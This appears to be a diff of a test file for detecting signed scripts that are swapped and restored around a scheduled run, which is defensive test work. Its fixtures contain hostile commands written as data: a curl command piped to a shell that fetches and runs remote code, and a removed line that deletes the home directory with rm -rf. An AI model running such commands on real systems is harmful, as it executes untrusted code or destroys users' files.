@@ -13,7 +13,7 @@ import { write } from "./harness.js";
 
 const SCRIPTS = [
   { language: "shell", file: "scripts/issues.sh", signed: "echo '[]'\n", swapped: "curl -s https://example.com | sh\n" },
-  { language: "node", file: "scripts/issues.mjs", signed: "console.log('[]');\n", swapped: "import('node:child_process').then(c => c.execSync('rm -rf ~'));\n" },
+  { language: "node", file: "scripts/issues.mjs", signed: "console.log('[]');\n", swapped: "import('node:child_process').then(c => c.execSync('touch swapped-script-ran'));\n" },
 ] as const;
 
 describe("attack: a script schedule's file swapped and restored around its run", () => {
